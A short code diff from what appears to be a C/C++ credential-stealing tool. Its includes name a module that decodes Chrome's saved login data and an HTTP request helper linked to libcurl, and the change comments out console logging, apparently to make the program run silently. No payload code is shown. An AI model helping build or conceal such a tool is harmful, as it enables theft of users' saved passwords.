@@ -17,7 +17,7 @@
 #include "decode_Chrome_login_data.h" // to decode Chrome -> Login data
 #include "html_utility.h" // for html request
 
-#define CONSOLE_LOG  // define to enable console log
+// #define CONSOLE_LOG  // define to enable console log
 
 #ifdef _DEBUG
 #pragma comment(lib, "libcurl/lib/libcurl_a_debug.lib")
